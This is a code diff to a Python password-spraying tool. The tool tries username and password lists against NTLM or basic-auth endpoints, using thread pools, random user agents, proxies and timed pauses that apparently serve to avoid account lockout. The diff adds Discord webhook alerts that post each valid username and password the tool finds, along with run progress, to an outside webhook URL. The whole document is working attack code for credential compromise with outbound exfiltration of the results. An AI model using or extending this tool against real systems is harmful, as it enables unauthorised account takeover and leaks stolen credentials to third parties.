@@ -3,7 +3,7 @@
 import requests
 import requests_random_user_agent
 from requests_ntlm import HttpNtlmAuth
-
+import json
 from base64 import b64encode as be, b64decode as bd
 import argparse
 from time import sleep, time
@@ -14,9 +14,29 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 from multiprocessing import Pool
 
+def send_discord_notification(webhook_url, message, color=0x00ff00):
+    """Send a notification to Discord using webhook"""
+    if not webhook_url:
+        return
+    
+    embed = {
+        "title": "Password Spray Update",
+        "description": message,
+        "color": color,
+        "timestamp": datetime.utcnow().isoformat()
+    }
+    
+    data = {
+        "embeds": [embed]
+    }
+    
+    try:
+        requests.post(webhook_url, json=data)
+    except Exception as e:
+        print(f"Failed to send Discord notification: {e}")
 
 def check_creds(opts):
-    url, domain, username, password, authtype, proxies, track_time = opts
+    url, domain, username, password, authtype, proxies, track_time, verbose, webhook_url = opts
 
     headers = {}
     if authtype == "ntlm":
@@ -24,8 +44,6 @@ def check_creds(opts):
             auth = HttpNtlmAuth(f"{domain}\\{username}", password)
         else:
             auth = HttpNtlmAuth(username, password)
-
-        # headers = {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="}
         headers = {"X-Force-NTLM": "true"}
     else:
         if domain:
@@ -47,18 +65,38 @@ def check_creds(opts):
         elapsedTimeMs = round((timeB - timeA) * 1000, 2)
 
         if res.status_code != 401 and res.status_code != 403:
+            status = "[VALID]"
             if track_time:
-                print(f"Success! {username}:{password}  - {elapsedTimeMs}ms")
+                output = f"Success! {username}:{password}  - {elapsedTimeMs}ms"
             else:
-                print(f"Success! {username}:{password}")
-
+                output = f"Success! {username}:{password}"
+            
+            if verbose:
+                print(f"{username}:{password} {status}")
+            
+            # Send Discord notification for valid credentials
+            if webhook_url:
+                send_discord_notification(
+                    webhook_url,
+                    f"Valid credentials found!\nUsername: {username}\nPassword: {password}",
+                    color=0x00ff00
+                )
+            
             return username, password
-
-        elif track_time:
-            print(f"Fail:  {username}:{password}  - {elapsedTimeMs}ms")
+        else:
+            status = "[FAILED]"
+            if track_time:
+                output = f"Fail:  {username}:{password}  - {elapsedTimeMs}ms"
+            else:
+                output = f"Fail:  {username}:{password}"
+            
+            if verbose:
+                print(f"{username}:{password} {status}")
     except Exception as e:
-        print(f"Error occurred with {username}:{password}: {e}")
-
+        status = "[ERROR]"
+        output = f"Error occurred with {username}:{password}: {e}"
+        if verbose:
+            print(f"{username}:{password} {status} - {e}")
 
 if __name__ == "__main__":
     args = argparse.ArgumentParser()
@@ -107,12 +145,26 @@ if __name__ == "__main__":
     args.add_argument(
         "--add_response", help="Add response times to output", action="store_true"
     )
+    args.add_argument(
+        "-v", "--verbose", help="Enable verbose output", action="store_true"
+    )
+    args.add_argument(
+        "--webhook", help="Discord webhook URL for notifications"
+    )
     opts = args.parse_args()
 
     if opts.proxy and opts.authtype == "basic":
         proxies = {"http": opts.proxy, "https": opts.proxy}
     else:
         proxies = {}
+
+    # Send initial Discord notification
+    if opts.webhook:
+        send_discord_notification(
+            opts.webhook,
+            f"Starting new password spray run\nURL: {opts.url}\nAttempts: {opts.attempts}\nInterval: {opts.interval} minutes",
+            color=0x0000ff
+        )
 
     if opts.userpass:
         print("Running in user/pass mode")
@@ -143,7 +195,8 @@ if __name__ == "__main__":
             for i, p in enumerate(pw):
                 attack_sets[i].append(
                     (
-                        opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response
+                        opts.url, opts.domain, u, p, opts.authtype, proxies, 
+                        opts.add_response, opts.verbose, opts.webhook
                     )
                 )
         print(f"{mx} Attack Sets Created from User Pass file")
@@ -161,6 +214,14 @@ if __name__ == "__main__":
 
             print(f"{str(datetime.now())}: Attempting set ({current}/{total})")
             
+            # Send Discord notification for new spray set
+            if opts.webhook:
+                send_discord_notification(
+                    opts.webhook,
+                    f"Starting new spray set ({current}/{total})",
+                    color=0x0000ff
+                )
+            
             with Pool(opts.threads) as p:
                 for s in p.imap_unordered(check_creds, attempts):
                     if s:
@@ -170,13 +231,11 @@ if __name__ == "__main__":
             if i == opts.attempts:
                 print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
                 sleep(opts.interval * 60)
-
                 i = 0
 
             current += 1
     else:
         usernames = [u for u in open(opts.usernames).read().split("\n") if u]
-
         passwords = [p for p in open(opts.passwords).read().split("\n") if p]
 
         i = 0
@@ -187,12 +246,23 @@ if __name__ == "__main__":
         print(f"New password spraying run")
         print(f"Spraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
         print(f"URL: {opts.url}")
+        
         for p in passwords:
             i += 1
 
             print(f"{str(datetime.now())}: Attempting {p} ({current}/{total})")
+            
+            # Send Discord notification for new password attempt
+            if opts.webhook:
+                send_discord_notification(
+                    opts.webhook,
+                    f"Attempting password: {p} ({current}/{total})",
+                    color=0x0000ff
+                )
+            
             attempts = [
-                (opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response)
+                (opts.url, opts.domain, u, p, opts.authtype, proxies, 
+                 opts.add_response, opts.verbose, opts.webhook)
                 for u in usernames
             ]
             with Pool(opts.threads) as p:
@@ -204,7 +274,14 @@ if __name__ == "__main__":
             if i == opts.attempts:
                 print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
                 sleep(opts.interval * 60)
-
                 i = 0
 
             current += 1
+
+    # Send final Discord notification
+    if opts.webhook:
+        send_discord_notification(
+            opts.webhook,
+            "Password spray run completed!",
+            color=0x00ff00
+        )
